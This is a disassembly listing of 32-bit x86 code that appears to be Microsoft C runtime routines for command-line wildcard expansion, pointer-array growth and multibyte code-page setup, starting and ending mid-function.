  405dbc:	eb 67                	jmp    0x405e25
  405dbe:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405dc1:	8d 04 86             	lea    (%esi,%eax,4),%eax
  405dc4:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405dc7:	8b d0                	mov    %eax,%edx
  405dc9:	89 55 f4             	mov    %edx,-0xc(%ebp)
  405dcc:	3b fb                	cmp    %ebx,%edi
  405dce:	74 4e                	je     0x405e1e
  405dd0:	8b c6                	mov    %esi,%eax
  405dd2:	2b c7                	sub    %edi,%eax
  405dd4:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405dd7:	8b 0f                	mov    (%edi),%ecx
  405dd9:	8d 41 01             	lea    0x1(%ecx),%eax
  405ddc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405ddf:	8a 01                	mov    (%ecx),%al
  405de1:	41                   	inc    %ecx
  405de2:	84 c0                	test   %al,%al
  405de4:	75 f9                	jne    0x405ddf
  405de6:	2b 4d f8             	sub    -0x8(%ebp),%ecx
  405de9:	8d 41 01             	lea    0x1(%ecx),%eax
  405dec:	50                   	push   %eax
  405ded:	ff 37                	push   (%edi)
  405def:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405df2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405df5:	2b c2                	sub    %edx,%eax
  405df7:	03 45 fc             	add    -0x4(%ebp),%eax
  405dfa:	50                   	push   %eax
  405dfb:	52                   	push   %edx
  405dfc:	e8 ba 2f 00 00       	call   0x408dbb
  405e01:	83 c4 10             	add    $0x10,%esp
  405e04:	85 c0                	test   %eax,%eax
  405e06:	75 36                	jne    0x405e3e
  405e08:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405e0b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405e0e:	89 14 38             	mov    %edx,(%eax,%edi,1)
  405e11:	83 c7 04             	add    $0x4,%edi
  405e14:	03 55 f8             	add    -0x8(%ebp),%edx
  405e17:	89 55 f4             	mov    %edx,-0xc(%ebp)
  405e1a:	3b fb                	cmp    %ebx,%edi
  405e1c:	75 b9                	jne    0x405dd7
  405e1e:	8b 45 0c             	mov    0xc(%ebp),%eax
  405e21:	33 ff                	xor    %edi,%edi
  405e23:	89 30                	mov    %esi,(%eax)
  405e25:	6a 00                	push   $0x0
  405e27:	e8 3d fe ff ff       	call   0x405c69
  405e2c:	59                   	pop    %ecx
  405e2d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405e30:	e8 30 02 00 00       	call   0x406065
  405e35:	8b c7                	mov    %edi,%eax
  405e37:	5f                   	pop    %edi
  405e38:	5b                   	pop    %ebx
  405e39:	5e                   	pop    %esi
  405e3a:	8b e5                	mov    %ebp,%esp
  405e3c:	5d                   	pop    %ebp
  405e3d:	c3                   	ret
  405e3e:	33 c0                	xor    %eax,%eax
  405e40:	50                   	push   %eax
  405e41:	50                   	push   %eax
  405e42:	50                   	push   %eax
  405e43:	50                   	push   %eax
  405e44:	50                   	push   %eax
  405e45:	e8 03 fd ff ff       	call   0x405b4d
  405e4a:	cc                   	int3
  405e4b:	8b ff                	mov    %edi,%edi
  405e4d:	55                   	push   %ebp
  405e4e:	8b ec                	mov    %esp,%ebp
  405e50:	51                   	push   %ecx
  405e51:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405e54:	8d 51 01             	lea    0x1(%ecx),%edx
  405e57:	8a 01                	mov    (%ecx),%al
  405e59:	41                   	inc    %ecx
  405e5a:	84 c0                	test   %al,%al
  405e5c:	75 f9                	jne    0x405e57
  405e5e:	2b ca                	sub    %edx,%ecx
  405e60:	83 c8 ff             	or     $0xffffffff,%eax
  405e63:	57                   	push   %edi
  405e64:	8b 7d 10             	mov    0x10(%ebp),%edi
  405e67:	41                   	inc    %ecx
  405e68:	2b c7                	sub    %edi,%eax
  405e6a:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405e6d:	3b c8                	cmp    %eax,%ecx
  405e6f:	76 05                	jbe    0x405e76
  405e71:	6a 0c                	push   $0xc
  405e73:	58                   	pop    %eax
  405e74:	eb 59                	jmp    0x405ecf
  405e76:	53                   	push   %ebx
  405e77:	56                   	push   %esi
  405e78:	8d 5f 01             	lea    0x1(%edi),%ebx
  405e7b:	03 d9                	add    %ecx,%ebx
  405e7d:	6a 01                	push   $0x1
  405e7f:	53                   	push   %ebx
  405e80:	e8 87 fd ff ff       	call   0x405c0c
  405e85:	8b f0                	mov    %eax,%esi
  405e87:	59                   	pop    %ecx
  405e88:	59                   	pop    %ecx
  405e89:	85 ff                	test   %edi,%edi
  405e8b:	74 12                	je     0x405e9f
  405e8d:	57                   	push   %edi
  405e8e:	ff 75 0c             	push   0xc(%ebp)
  405e91:	53                   	push   %ebx
  405e92:	56                   	push   %esi
  405e93:	e8 23 2f 00 00       	call   0x408dbb
  405e98:	83 c4 10             	add    $0x10,%esp
  405e9b:	85 c0                	test   %eax,%eax
  405e9d:	75 35                	jne    0x405ed4
  405e9f:	ff 75 fc             	push   -0x4(%ebp)
  405ea2:	2b df                	sub    %edi,%ebx
  405ea4:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  405ea7:	ff 75 08             	push   0x8(%ebp)
  405eaa:	53                   	push   %ebx
  405eab:	50                   	push   %eax
  405eac:	e8 0a 2f 00 00       	call   0x408dbb
  405eb1:	83 c4 10             	add    $0x10,%esp
  405eb4:	85 c0                	test   %eax,%eax
  405eb6:	75 1c                	jne    0x405ed4
  405eb8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405ebb:	56                   	push   %esi
  405ebc:	e8 c9 01 00 00       	call   0x40608a
  405ec1:	6a 00                	push   $0x0
  405ec3:	8b f0                	mov    %eax,%esi
  405ec5:	e8 9f fd ff ff       	call   0x405c69
  405eca:	59                   	pop    %ecx
  405ecb:	8b c6                	mov    %esi,%eax
  405ecd:	5e                   	pop    %esi
  405ece:	5b                   	pop    %ebx
  405ecf:	5f                   	pop    %edi
  405ed0:	8b e5                	mov    %ebp,%esp
  405ed2:	5d                   	pop    %ebp
  405ed3:	c3                   	ret
  405ed4:	33 c0                	xor    %eax,%eax
  405ed6:	50                   	push   %eax
  405ed7:	50                   	push   %eax
  405ed8:	50                   	push   %eax
  405ed9:	50                   	push   %eax
  405eda:	50                   	push   %eax
  405edb:	e8 6d fc ff ff       	call   0x405b4d
  405ee0:	cc                   	int3
  405ee1:	8b ff                	mov    %edi,%edi
  405ee3:	55                   	push   %ebp
  405ee4:	8b ec                	mov    %esp,%ebp
  405ee6:	81 ec 50 01 00 00    	sub    $0x150,%esp
  405eec:	a1 00 40 41 00       	mov    0x414000,%eax
  405ef1:	33 c5                	xor    %ebp,%eax
  405ef3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405ef6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405ef9:	53                   	push   %ebx
  405efa:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405efd:	56                   	push   %esi
  405efe:	8b 75 10             	mov    0x10(%ebp),%esi
  405f01:	57                   	push   %edi
  405f02:	89 b5 b8 fe ff ff    	mov    %esi,-0x148(%ebp)
  405f08:	eb 19                	jmp    0x405f23
  405f0a:	8a 01                	mov    (%ecx),%al
  405f0c:	3c 2f                	cmp    $0x2f,%al
  405f0e:	74 17                	je     0x405f27
  405f10:	3c 5c                	cmp    $0x5c,%al
  405f12:	74 13                	je     0x405f27
  405f14:	3c 3a                	cmp    $0x3a,%al
  405f16:	74 0f                	je     0x405f27
  405f18:	51                   	push   %ecx
  405f19:	53                   	push   %ebx
  405f1a:	e8 f1 2e 00 00       	call   0x408e10
  405f1f:	59                   	pop    %ecx
  405f20:	59                   	pop    %ecx
  405f21:	8b c8                	mov    %eax,%ecx
  405f23:	3b cb                	cmp    %ebx,%ecx
  405f25:	75 e3                	jne    0x405f0a
  405f27:	8a 11                	mov    (%ecx),%dl
  405f29:	80 fa 3a             	cmp    $0x3a,%dl
  405f2c:	75 17                	jne    0x405f45
  405f2e:	8d 43 01             	lea    0x1(%ebx),%eax
  405f31:	3b c8                	cmp    %eax,%ecx
  405f33:	74 10                	je     0x405f45
  405f35:	56                   	push   %esi
  405f36:	33 ff                	xor    %edi,%edi
  405f38:	57                   	push   %edi
  405f39:	57                   	push   %edi
  405f3a:	53                   	push   %ebx
  405f3b:	e8 0b ff ff ff       	call   0x405e4b
  405f40:	83 c4 10             	add    $0x10,%esp
  405f43:	eb 7a                	jmp    0x405fbf
  405f45:	33 ff                	xor    %edi,%edi
  405f47:	80 fa 2f             	cmp    $0x2f,%dl
  405f4a:	74 0e                	je     0x405f5a
  405f4c:	80 fa 5c             	cmp    $0x5c,%dl
  405f4f:	74 09                	je     0x405f5a
  405f51:	80 fa 3a             	cmp    $0x3a,%dl
  405f54:	74 04                	je     0x405f5a
  405f56:	8b c7                	mov    %edi,%eax
  405f58:	eb 03                	jmp    0x405f5d
  405f5a:	33 c0                	xor    %eax,%eax
  405f5c:	40                   	inc    %eax
  405f5d:	0f b6 c0             	movzbl %al,%eax
  405f60:	2b cb                	sub    %ebx,%ecx
  405f62:	41                   	inc    %ecx
  405f63:	f7 d8                	neg    %eax
  405f65:	68 40 01 00 00       	push   $0x140
  405f6a:	1b c0                	sbb    %eax,%eax
  405f6c:	23 c1                	and    %ecx,%eax
  405f6e:	89 85 b4 fe ff ff    	mov    %eax,-0x14c(%ebp)
  405f74:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  405f7a:	57                   	push   %edi
  405f7b:	50                   	push   %eax
  405f7c:	e8 ef c5 ff ff       	call   0x402570
  405f81:	83 c4 0c             	add    $0xc,%esp
  405f84:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  405f8a:	57                   	push   %edi
  405f8b:	57                   	push   %edi
  405f8c:	57                   	push   %edi
  405f8d:	50                   	push   %eax
  405f8e:	57                   	push   %edi
  405f8f:	53                   	push   %ebx
  405f90:	ff 15 dc d0 40 00    	call   *0x40d0dc
  405f96:	8b f0                	mov    %eax,%esi
  405f98:	8b 85 b8 fe ff ff    	mov    -0x148(%ebp),%eax
  405f9e:	83 fe ff             	cmp    $0xffffffff,%esi
  405fa1:	75 2d                	jne    0x405fd0
  405fa3:	50                   	push   %eax
  405fa4:	57                   	push   %edi
  405fa5:	57                   	push   %edi
  405fa6:	53                   	push   %ebx
  405fa7:	e8 9f fe ff ff       	call   0x405e4b
  405fac:	83 c4 10             	add    $0x10,%esp
  405faf:	8b f8                	mov    %eax,%edi
  405fb1:	83 fe ff             	cmp    $0xffffffff,%esi
  405fb4:	74 07                	je     0x405fbd
  405fb6:	56                   	push   %esi
  405fb7:	ff 15 d8 d0 40 00    	call   *0x40d0d8
  405fbd:	8b c7                	mov    %edi,%eax
  405fbf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405fc2:	5f                   	pop    %edi
  405fc3:	5e                   	pop    %esi
  405fc4:	33 cd                	xor    %ebp,%ecx
  405fc6:	5b                   	pop    %ebx
  405fc7:	e8 92 b2 ff ff       	call   0x40125e
  405fcc:	8b e5                	mov    %ebp,%esp
  405fce:	5d                   	pop    %ebp
  405fcf:	c3                   	ret
  405fd0:	8b 48 04             	mov    0x4(%eax),%ecx
  405fd3:	2b 08                	sub    (%eax),%ecx
  405fd5:	c1 f9 02             	sar    $0x2,%ecx
  405fd8:	89 8d b0 fe ff ff    	mov    %ecx,-0x150(%ebp)
  405fde:	80 bd e8 fe ff ff 2e 	cmpb   $0x2e,-0x118(%ebp)
  405fe5:	75 18                	jne    0x405fff
  405fe7:	8a 8d e9 fe ff ff    	mov    -0x117(%ebp),%cl
  405fed:	84 c9                	test   %cl,%cl
  405fef:	74 29                	je     0x40601a
  405ff1:	80 f9 2e             	cmp    $0x2e,%cl
  405ff4:	75 09                	jne    0x405fff
  405ff6:	80 bd ea fe ff ff 00 	cmpb   $0x0,-0x116(%ebp)
  405ffd:	74 1b                	je     0x40601a
  405fff:	50                   	push   %eax
  406000:	ff b5 b4 fe ff ff    	push   -0x14c(%ebp)
  406006:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  40600c:	53                   	push   %ebx
  40600d:	50                   	push   %eax
  40600e:	e8 38 fe ff ff       	call   0x405e4b
  406013:	83 c4 10             	add    $0x10,%esp
  406016:	85 c0                	test   %eax,%eax
  406018:	75 95                	jne    0x405faf
  40601a:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  406020:	50                   	push   %eax
  406021:	56                   	push   %esi
  406022:	ff 15 e0 d0 40 00    	call   *0x40d0e0
  406028:	85 c0                	test   %eax,%eax
  40602a:	8b 85 b8 fe ff ff    	mov    -0x148(%ebp),%eax
  406030:	75 ac                	jne    0x405fde
  406032:	8b 10                	mov    (%eax),%edx
  406034:	8b 40 04             	mov    0x4(%eax),%eax
  406037:	8b 8d b0 fe ff ff    	mov    -0x150(%ebp),%ecx
  40603d:	2b c2                	sub    %edx,%eax
  40603f:	c1 f8 02             	sar    $0x2,%eax
  406042:	3b c8                	cmp    %eax,%ecx
  406044:	0f 84 67 ff ff ff    	je     0x405fb1
  40604a:	68 a3 5c 40 00       	push   $0x405ca3
  40604f:	2b c1                	sub    %ecx,%eax
  406051:	6a 04                	push   $0x4
  406053:	50                   	push   %eax
  406054:	8d 04 8a             	lea    (%edx,%ecx,4),%eax
  406057:	50                   	push   %eax
  406058:	e8 13 29 00 00       	call   0x408970
  40605d:	83 c4 10             	add    $0x10,%esp
  406060:	e9 4c ff ff ff       	jmp    0x405fb1
  406065:	8b ff                	mov    %edi,%edi
  406067:	56                   	push   %esi
  406068:	57                   	push   %edi
  406069:	8b f9                	mov    %ecx,%edi
  40606b:	8b 37                	mov    (%edi),%esi
  40606d:	eb 0b                	jmp    0x40607a
  40606f:	ff 36                	push   (%esi)
  406071:	e8 f3 fb ff ff       	call   0x405c69
  406076:	59                   	pop    %ecx
  406077:	83 c6 04             	add    $0x4,%esi
  40607a:	3b 77 04             	cmp    0x4(%edi),%esi
  40607d:	75 f0                	jne    0x40606f
  40607f:	ff 37                	push   (%edi)
  406081:	e8 e3 fb ff ff       	call   0x405c69
  406086:	59                   	pop    %ecx
  406087:	5f                   	pop    %edi
  406088:	5e                   	pop    %esi
  406089:	c3                   	ret
  40608a:	8b ff                	mov    %edi,%edi
  40608c:	55                   	push   %ebp
  40608d:	8b ec                	mov    %esp,%ebp
  40608f:	56                   	push   %esi
  406090:	57                   	push   %edi
  406091:	8b f1                	mov    %ecx,%esi
  406093:	e8 27 00 00 00       	call   0x4060bf
  406098:	8b f8                	mov    %eax,%edi
  40609a:	85 ff                	test   %edi,%edi
  40609c:	74 0d                	je     0x4060ab
  40609e:	ff 75 08             	push   0x8(%ebp)
  4060a1:	e8 c3 fb ff ff       	call   0x405c69
  4060a6:	59                   	pop    %ecx
  4060a7:	8b c7                	mov    %edi,%eax
  4060a9:	eb 0e                	jmp    0x4060b9
  4060ab:	8b 4e 04             	mov    0x4(%esi),%ecx
  4060ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4060b1:	89 01                	mov    %eax,(%ecx)
  4060b3:	83 46 04 04          	addl   $0x4,0x4(%esi)
  4060b7:	33 c0                	xor    %eax,%eax
  4060b9:	5f                   	pop    %edi
  4060ba:	5e                   	pop    %esi
  4060bb:	5d                   	pop    %ebp
  4060bc:	c2 04 00             	ret    $0x4
  4060bf:	8b ff                	mov    %edi,%edi
  4060c1:	56                   	push   %esi
  4060c2:	8b f1                	mov    %ecx,%esi
  4060c4:	57                   	push   %edi
  4060c5:	8b 7e 08             	mov    0x8(%esi),%edi
  4060c8:	39 7e 04             	cmp    %edi,0x4(%esi)
  4060cb:	74 04                	je     0x4060d1
  4060cd:	33 c0                	xor    %eax,%eax
  4060cf:	eb 72                	jmp    0x406143
  4060d1:	83 3e 00             	cmpl   $0x0,(%esi)
  4060d4:	75 2b                	jne    0x406101
  4060d6:	6a 04                	push   $0x4
  4060d8:	6a 04                	push   $0x4
  4060da:	e8 2d fb ff ff       	call   0x405c0c
  4060df:	6a 00                	push   $0x0
  4060e1:	89 06                	mov    %eax,(%esi)
  4060e3:	e8 81 fb ff ff       	call   0x405c69
  4060e8:	8b 06                	mov    (%esi),%eax
  4060ea:	83 c4 0c             	add    $0xc,%esp
  4060ed:	85 c0                	test   %eax,%eax
  4060ef:	75 05                	jne    0x4060f6
  4060f1:	6a 0c                	push   $0xc
  4060f3:	58                   	pop    %eax
  4060f4:	eb 4d                	jmp    0x406143
  4060f6:	89 46 04             	mov    %eax,0x4(%esi)
  4060f9:	83 c0 10             	add    $0x10,%eax
  4060fc:	89 46 08             	mov    %eax,0x8(%esi)
  4060ff:	eb cc                	jmp    0x4060cd
  406101:	2b 3e                	sub    (%esi),%edi
  406103:	c1 ff 02             	sar    $0x2,%edi
  406106:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  40610c:	77 e3                	ja     0x4060f1
  40610e:	53                   	push   %ebx
  40610f:	6a 04                	push   $0x4
  406111:	8d 1c 3f             	lea    (%edi,%edi,1),%ebx
  406114:	53                   	push   %ebx
  406115:	ff 36                	push   (%esi)
  406117:	e8 ff 1a 00 00       	call   0x407c1b
  40611c:	83 c4 0c             	add    $0xc,%esp
  40611f:	85 c0                	test   %eax,%eax
  406121:	75 05                	jne    0x406128
  406123:	6a 0c                	push   $0xc
  406125:	5e                   	pop    %esi
  406126:	eb 10                	jmp    0x406138
  406128:	89 06                	mov    %eax,(%esi)
  40612a:	8d 0c b8             	lea    (%eax,%edi,4),%ecx
  40612d:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  406130:	89 4e 04             	mov    %ecx,0x4(%esi)
  406133:	89 46 08             	mov    %eax,0x8(%esi)
  406136:	33 f6                	xor    %esi,%esi
  406138:	6a 00                	push   $0x0
  40613a:	e8 2a fb ff ff       	call   0x405c69
  40613f:	59                   	pop    %ecx
  406140:	8b c6                	mov    %esi,%eax
  406142:	5b                   	pop    %ebx
  406143:	5f                   	pop    %edi
  406144:	5e                   	pop    %esi
  406145:	c3                   	ret
  406146:	8b ff                	mov    %edi,%edi
  406148:	55                   	push   %ebp
  406149:	8b ec                	mov    %esp,%ebp
  40614b:	5d                   	pop    %ebp
  40614c:	e9 6a fb ff ff       	jmp    0x405cbb
  406151:	6a 08                	push   $0x8
  406153:	68 e0 27 41 00       	push   $0x4127e0
  406158:	e8 43 ba ff ff       	call   0x401ba0
  40615d:	8b 45 08             	mov    0x8(%ebp),%eax
  406160:	ff 30                	push   (%eax)
  406162:	e8 7b 09 00 00       	call   0x406ae2
  406167:	59                   	pop    %ecx
  406168:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40616c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40616f:	e8 48 00 00 00       	call   0x4061bc
  406174:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40617b:	e8 08 00 00 00       	call   0x406188
  406180:	e8 6b ba ff ff       	call   0x401bf0
  406185:	c2 0c 00             	ret    $0xc
  406188:	8b 45 10             	mov    0x10(%ebp),%eax
  40618b:	ff 30                	push   (%eax)
  40618d:	e8 98 09 00 00       	call   0x406b2a
  406192:	59                   	pop    %ecx
  406193:	c3                   	ret
  406194:	8b ff                	mov    %edi,%edi
  406196:	55                   	push   %ebp
  406197:	8b ec                	mov    %esp,%ebp
  406199:	83 ec 0c             	sub    $0xc,%esp
  40619c:	8b 45 08             	mov    0x8(%ebp),%eax
  40619f:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  4061a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4061a5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4061a8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4061ab:	50                   	push   %eax
  4061ac:	ff 75 0c             	push   0xc(%ebp)
  4061af:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4061b2:	50                   	push   %eax
  4061b3:	e8 99 ff ff ff       	call   0x406151
  4061b8:	8b e5                	mov    %ebp,%esp
  4061ba:	5d                   	pop    %ebp
  4061bb:	c3                   	ret
  4061bc:	8b ff                	mov    %edi,%edi
  4061be:	56                   	push   %esi
  4061bf:	8b f1                	mov    %ecx,%esi
  4061c1:	6a 0c                	push   $0xc
  4061c3:	8b 06                	mov    (%esi),%eax
  4061c5:	8b 00                	mov    (%eax),%eax
  4061c7:	8b 40 48             	mov    0x48(%eax),%eax
  4061ca:	8b 40 04             	mov    0x4(%eax),%eax
  4061cd:	a3 44 4d 41 00       	mov    %eax,0x414d44
  4061d2:	8b 06                	mov    (%esi),%eax
  4061d4:	8b 00                	mov    (%eax),%eax
  4061d6:	8b 40 48             	mov    0x48(%eax),%eax
  4061d9:	8b 40 08             	mov    0x8(%eax),%eax
  4061dc:	a3 48 4d 41 00       	mov    %eax,0x414d48
  4061e1:	8b 06                	mov    (%esi),%eax
  4061e3:	8b 00                	mov    (%eax),%eax
  4061e5:	8b 40 48             	mov    0x48(%eax),%eax
  4061e8:	8b 80 1c 02 00 00    	mov    0x21c(%eax),%eax
  4061ee:	a3 40 4d 41 00       	mov    %eax,0x414d40
  4061f3:	8b 06                	mov    (%esi),%eax
  4061f5:	8b 00                	mov    (%eax),%eax
  4061f7:	8b 40 48             	mov    0x48(%eax),%eax
  4061fa:	83 c0 0c             	add    $0xc,%eax
  4061fd:	50                   	push   %eax
  4061fe:	6a 0c                	push   $0xc
  406200:	68 4c 4d 41 00       	push   $0x414d4c
  406205:	e8 d2 06 00 00       	call   0x4068dc
  40620a:	8b 06                	mov    (%esi),%eax
  40620c:	b9 01 01 00 00       	mov    $0x101,%ecx
  406211:	51                   	push   %ecx
  406212:	8b 00                	mov    (%eax),%eax
  406214:	8b 40 48             	mov    0x48(%eax),%eax
  406217:	83 c0 18             	add    $0x18,%eax
  40621a:	50                   	push   %eax
  40621b:	51                   	push   %ecx
  40621c:	68 50 41 41 00       	push   $0x414150
  406221:	e8 b6 06 00 00       	call   0x4068dc
  406226:	8b 06                	mov    (%esi),%eax
  406228:	b9 00 01 00 00       	mov    $0x100,%ecx
  40622d:	51                   	push   %ecx
  40622e:	8b 00                	mov    (%eax),%eax
  406230:	8b 40 48             	mov    0x48(%eax),%eax
  406233:	05 19 01 00 00       	add    $0x119,%eax
  406238:	50                   	push   %eax
  406239:	51                   	push   %ecx
  40623a:	68 58 42 41 00       	push   $0x414258
  40623f:	e8 98 06 00 00       	call   0x4068dc
  406244:	a1 78 45 41 00       	mov    0x414578,%eax
  406249:	83 c4 30             	add    $0x30,%esp
  40624c:	83 c9 ff             	or     $0xffffffff,%ecx
  40624f:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  406253:	75 13                	jne    0x406268
  406255:	a1 78 45 41 00       	mov    0x414578,%eax
  40625a:	3d 58 43 41 00       	cmp    $0x414358,%eax
  40625f:	74 07                	je     0x406268
  406261:	50                   	push   %eax
  406262:	e8 02 fa ff ff       	call   0x405c69
  406267:	59                   	pop    %ecx
  406268:	8b 06                	mov    (%esi),%eax
  40626a:	8b 00                	mov    (%eax),%eax
  40626c:	8b 40 48             	mov    0x48(%eax),%eax
  40626f:	a3 78 45 41 00       	mov    %eax,0x414578
  406274:	8b 06                	mov    (%esi),%eax
  406276:	8b 00                	mov    (%eax),%eax
  406278:	8b 40 48             	mov    0x48(%eax),%eax
  40627b:	f0 ff 00             	lock incl (%eax)
  40627e:	5e                   	pop    %esi
  40627f:	c3                   	ret
  406280:	8b ff                	mov    %edi,%edi
  406282:	55                   	push   %ebp
  406283:	8b ec                	mov    %esp,%ebp
  406285:	8b 45 08             	mov    0x8(%ebp),%eax
  406288:	2d a4 03 00 00       	sub    $0x3a4,%eax
  40628d:	74 28                	je     0x4062b7
  40628f:	83 e8 04             	sub    $0x4,%eax
  406292:	74 1c                	je     0x4062b0
  406294:	83 e8 0d             	sub    $0xd,%eax
  406297:	74 10                	je     0x4062a9
  406299:	83 e8 01             	sub    $0x1,%eax
  40629c:	74 04                	je     0x4062a2
  40629e:	33 c0                	xor    %eax,%eax
  4062a0:	5d                   	pop    %ebp
  4062a1:	c3                   	ret
  4062a2:	a1 44 df 40 00       	mov    0x40df44,%eax
  4062a7:	5d                   	pop    %ebp
  4062a8:	c3                   	ret
  4062a9:	a1 40 df 40 00       	mov    0x40df40,%eax
  4062ae:	5d                   	pop    %ebp
  4062af:	c3                   	ret
  4062b0:	a1 3c df 40 00       	mov    0x40df3c,%eax
  4062b5:	5d                   	pop    %ebp
  4062b6:	c3                   	ret
  4062b7:	a1 38 df 40 00       	mov    0x40df38,%eax
  4062bc:	5d                   	pop    %ebp
  4062bd:	c3                   	ret
  4062be:	8b ff                	mov    %edi,%edi
  4062c0:	55                   	push   %ebp
  4062c1:	8b ec                	mov    %esp,%ebp
  4062c3:	83 ec 10             	sub    $0x10,%esp
  4062c6:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4062c9:	6a 00                	push   $0x0
  4062cb:	e8 ad f0 ff ff       	call   0x40537d
  4062d0:	83 25 58 4d 41 00 00 	andl   $0x0,0x414d58
  4062d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4062da:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4062dd:	75 12                	jne    0x4062f1
  4062df:	c7 05 58 4d 41 00 01 	movl   $0x1,0x414d58
  4062e6:	00 00 00 
  4062e9:	ff 15 e8 d0 40 00    	call   *0x40d0e8
  4062ef:	eb 2c                	jmp    0x40631d
  4062f1:	83 f8 fd             	cmp    $0xfffffffd,%eax
  4062f4:	75 12                	jne    0x406308
  4062f6:	c7 05 58 4d 41 00 01 	movl   $0x1,0x414d58
  4062fd:	00 00 00 
  406300:	ff 15 c8 d0 40 00    	call   *0x40d0c8
  406306:	eb 15                	jmp    0x40631d
  406308:	83 f8 fc             	cmp    $0xfffffffc,%eax
  40630b:	75 10                	jne    0x40631d
  40630d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406310:	c7 05 58 4d 41 00 01 	movl   $0x1,0x414d58
  406317:	00 00 00 
  40631a:	8b 40 08             	mov    0x8(%eax),%eax
  40631d:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  406321:	74 0a                	je     0x40632d
  406323:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406326:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  40632d:	8b e5                	mov    %ebp,%esp
  40632f:	5d                   	pop    %ebp
  406330:	c3                   	ret
  406331:	8b ff                	mov    %edi,%edi
  406333:	55                   	push   %ebp
  406334:	8b ec                	mov    %esp,%ebp
  406336:	53                   	push   %ebx
  406337:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40633a:	56                   	push   %esi
  40633b:	57                   	push   %edi
  40633c:	68 01 01 00 00       	push   $0x101
  406341:	33 ff                	xor    %edi,%edi
  406343:	8d 73 18             	lea    0x18(%ebx),%esi
  406346:	57                   	push   %edi
  406347:	56                   	push   %esi
  406348:	e8 23 c2 ff ff       	call   0x402570
  40634d:	89 7b 04             	mov    %edi,0x4(%ebx)
  406350:	33 c0                	xor    %eax,%eax
  406352:	89 7b 08             	mov    %edi,0x8(%ebx)
  406355:	83 c4 0c             	add    $0xc,%esp
  406358:	89 bb 1c 02 00 00    	mov    %edi,0x21c(%ebx)
  40635e:	b9 01 01 00 00       	mov    $0x101,%ecx
  406363:	8d 7b 0c             	lea    0xc(%ebx),%edi
  406366:	ab                   	stos   %eax,%es:(%edi)
  406367:	ab                   	stos   %eax,%es:(%edi)
  406368:	ab                   	stos   %eax,%es:(%edi)
  406369:	bf 58 43 41 00       	mov    $0x414358,%edi
  40636e:	2b fb                	sub    %ebx,%edi
  406370:	8a 04 37             	mov    (%edi,%esi,1),%al
  406373:	88 06                	mov    %al,(%esi)
  406375:	46                   	inc    %esi
  406376:	83 e9 01             	sub    $0x1,%ecx
  406379:	75 f5                	jne    0x406370
  40637b:	8d 8b 19 01 00 00    	lea    0x119(%ebx),%ecx
  406381:	ba 00 01 00 00       	mov    $0x100,%edx
  406386:	8a 04 39             	mov    (%ecx,%edi,1),%al
  406389:	88 01                	mov    %al,(%ecx)
  40638b:	41                   	inc    %ecx
  40638c:	83 ea 01             	sub    $0x1,%edx
  40638f:	75 f5                	jne    0x406386
  406391:	5f                   	pop    %edi
  406392:	5e                   	pop    %esi
  406393:	5b                   	pop    %ebx
  406394:	5d                   	pop    %ebp
  406395:	c3                   	ret
  406396:	8b ff                	mov    %edi,%edi
  406398:	55                   	push   %ebp
  406399:	8b ec                	mov    %esp,%ebp
  40639b:	81 ec 20 07 00 00    	sub    $0x720,%esp
  4063a1:	a1 00 40 41 00       	mov    0x414000,%eax
  4063a6:	33 c5                	xor    %ebp,%eax
  4063a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4063ab:	53                   	push   %ebx
  4063ac:	56                   	push   %esi
  4063ad:	8b 75 08             	mov    0x8(%ebp),%esi
  4063b0:	8d 85 e8 f8 ff ff    	lea    -0x718(%ebp),%eax
  4063b6:	57                   	push   %edi
  4063b7:	50                   	push   %eax
  4063b8:	ff 76 04             	push   0x4(%esi)
  4063bb:	ff 15 ec d0 40 00    	call   *0x40d0ec
  4063c1:	33 db                	xor    %ebx,%ebx
  4063c3:	bf 00 01 00 00       	mov    $0x100,%edi
  4063c8:	85 c0                	test   %eax,%eax
  4063ca:	0f 84 f0 00 00 00    	je     0x4064c0
  4063d0:	8b c3                	mov    %ebx,%eax
  4063d2:	88 84 05 fc fe ff ff 	mov    %al,-0x104(%ebp,%eax,1)
  4063d9:	40                   	inc    %eax
  4063da:	3b c7                	cmp    %edi,%eax
  4063dc:	72 f4                	jb     0x4063d2
  4063de:	8a 85 ee f8 ff ff    	mov    -0x712(%ebp),%al
